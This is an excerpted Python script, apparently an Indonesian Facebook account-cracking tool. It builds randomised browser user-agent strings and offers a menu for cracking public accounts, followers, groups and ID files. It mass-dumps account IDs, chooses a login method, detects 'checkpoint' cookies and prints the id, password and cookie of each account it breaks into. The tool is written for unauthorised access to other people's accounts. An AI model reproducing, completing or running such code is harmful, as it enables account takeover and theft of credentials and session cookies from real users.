...
for xd in range(10000):
	a='Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1'
	...
	k='Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1'
	...
	l='Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1'
...
def menu(my_name,my_id):
	...
	print(f'╰─> Your Ip  : {ip}')
	print('')
	print(f'<•> [1] Crack Publik   {h}[On]{x} ')
	print(f'<•> [2] Crack Follower {h}[on]{x} ')
	print(f'<•> [3] Crack Grup     {h}[on]{x} ')
	print(f'<•> [4] Crack File     {h}[on]{x} ')
	print(f'<•> [5] Hasil Crack    {h}[On]{x} ')
	print(f'<•> [0] {m}Keluar{x}       ')
...
def dump_massal():
	...
	try:
		...
		print('>>• Masukkan Yang Bener, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	print(f'<•> [1] Mobile {h}[Disarankan]{x} ')
#print('>> 2. Mbasic ')
#print('>> 3. Touch  ')
#print('>> 4. Mtouch ')
	print('')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}{b}╰─>{x} {b}{idf}|{pw}|{kuki}{N}')
